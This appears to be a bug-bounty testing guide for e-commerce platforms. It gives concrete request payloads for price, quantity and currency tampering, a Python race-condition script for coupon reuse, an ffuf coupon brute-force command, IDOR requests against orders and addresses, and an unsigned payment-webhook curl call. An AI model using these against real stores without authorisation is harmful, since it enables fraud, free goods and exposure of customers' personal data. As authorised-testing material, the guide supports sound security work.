# E-Commerce — Target Guide

> E-commerce platforms combine financial transactions, PII, and complex business logic — all high-paying bug classes.

---

## High-Value Attack Surface

**Checkout and payment flow** — Price, discount, coupon manipulation

**Order management** — IDOR on orders, shipment manipulation

**User accounts and addresses** — PII exposure, address IDOR

**Admin/seller portal** — Inventory, pricing, order fulfillment

**Product reviews and Q&A** — Stored XSS opportunities

**Discount and coupon system** — Race conditions, reuse, generation

**Referral programs** — Self-referral, race conditions, code generation

**Third-party integrations** — Payment gateways, shipping APIs, analytics

---

## Phase 1 — Recon Focus

```bash
# Subdomain patterns
api., admin., seller., vendor., merchant., warehouse.,
analytics., checkout., pay., store., shop., staging.,
cdn., static., images., uploads.

# API patterns
/api/v1/products, /api/v1/orders, /api/v1/users,
/api/v1/cart, /api/v1/checkout, /api/v1/payments,
/api/v1/coupons, /api/v1/reviews, /api/v1/admin

# Admin panel locations
/admin, /seller, /merchant, /vendor, /dashboard,
/manage, /store-admin, /ops, /fulfillment

# GraphQL (common in modern e-commerce)
/graphql, /api/graphql
```

---

## Phase 2 — High-Impact Tests

### Price & Order Manipulation
```bash
# Intercept add-to-cart or checkout request
# Modify price field
POST /api/cart/add
{"product_id": "P123", "quantity": 1, "price": 0.01}

# Modify quantity to negative
{"product_id": "P123", "quantity": -1}  # get credited?

# Modify currency
{"amount": 100, "currency": "JPY"}  # 100 JPY instead of 100 USD

# Modify before vs after tax/shipping
POST /api/checkout
{"subtotal": 99.99, "tax": -99.99, "total": 0.01}

# Replay old order at old (discounted) price
# If order ID is predictable, replay with same order ID
```

### Discount & Coupon Abuse
```bash
# Test coupon reuse
# Apply coupon → checkout → start new order → apply same coupon

# Race condition — apply coupon multiple times simultaneously
import concurrent.futures, requests

def apply_coupon():
    return requests.post('/api/cart/coupon',
        json={'code': 'SAVE50'},
        cookies={'session': SESSION})

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    [ex.submit(apply_coupon) for _ in range(20)]

# Coupon stacking
POST /api/cart/coupon
{"codes": ["SAVE10", "SAVE20", "SAVE30"]}   # stack multiple

# Coupon code enumeration
# If SAVE-XXXXXX pattern, brute force XXXXXX
ffuf -u https://target.com/api/coupon/FUZZ -w <(seq -w 100000 999999) -mc 200

# Test if coupons apply to ineligible products
```

### Order IDOR
```bash
# Order IDs are often sequential or predictable
GET /api/orders/ORD-00123  → try ORD-00122, ORD-00124

# Order detail IDOR (contains: name, address, email, items, total)
GET /my/orders/12345/details

# Shipment tracking IDOR
GET /api/shipment/TRACK_NUMBER_NOT_YOURS

# Invoice IDOR
GET /invoices/INV-12345.pdf  → try INV-12344.pdf

# Order cancellation/modification IDOR
POST /api/orders/VICTIM_ORDER/cancel
Authorization: Bearer ATTACKER_TOKEN
```

### Seller/Vendor Portal Testing
```bash
# If platform has seller accounts:
# Can a buyer access seller functions?
# Can seller A access seller B's orders/data?

# Seller account price manipulation
PUT /api/seller/products/PRODUCT_ID/price
{"price": -9.99}   # negative price = user gets paid to buy

# Inventory manipulation
PUT /api/seller/products/COMPETITOR_PRODUCT/stock
{"quantity": 0}    # IDOR to zero out competitor's stock

# Payout manipulation
GET /api/seller/payouts/PAYOUT_ID   # IDOR
```

### Payment Gateway Testing
```bash
# Webhook signature bypass (already covered in fintech guide)
# Test without signature header
curl -X POST /webhooks/payment-success \
  -d '{"order_id": "ORD-999", "status": "paid", "amount": 100}'

# Test partial payment as full payment
# Pay 1 cent, mark order as paid

# Test currency rounding abuse
# 0.005 → rounds to 0.01 in some systems, 0.00 in others

# Test duplicate payment confirmation
# Same payment ID submitted twice → order fulfilled twice?
```

---

## Phase 3 — Business Logic

```bash
# Return/refund abuse
# Submit return for items never purchased
# Inflate return quantity above original purchase
# Return digital goods (impossible to "return" but refunded?)

# Gift card manipulation
# Purchase gift card → use it → refund purchase → gift card still valid?
# Negative amount on gift card
# Transfer gift card balance to attacker account (IDOR)

# Loyalty points abuse
# Earn points without purchase
# Race condition to redeem same points twice
# IDOR to transfer victim's points

# Flash sale abuse
# Race condition on limited-quantity items
# Purchase more than allowed limit via concurrent requests
# Reserve item in cart without purchasing to deny stock

# Review/rating manipulation
# Post review for product you never bought
# IDOR to edit/delete other users' reviews
# Stored XSS in review content rendered to all visitors
```

---

## Phase 4 — PII Exposure

```bash
# Order confirmation emails/pages
# Do order pages show more PII than necessary?

# User address IDOR
GET /api/users/12345/addresses  → change 12345 to another user ID

# Admin order export
GET /api/admin/orders/export?format=csv  # with regular user token

# Search functionality leaking PII
GET /api/users/search?email=victim@email.com

# Does checkout show partial payment info in source?
view-source:https://target.com/order/confirmation/12345
```

---

## Severity in E-Commerce Context

**Order/payment manipulation (get items free)** → Critical

**IDOR on full order details (name, address, email)** → High

**Coupon race condition (financial loss)** → High

**Competitor stock zeroing via IDOR** → High

**Payment webhook bypass** → Critical

**Stored XSS in reviews (all visitors affected)** → High

**Price manipulation via API** → Critical

**Gift card balance theft via IDOR** → High
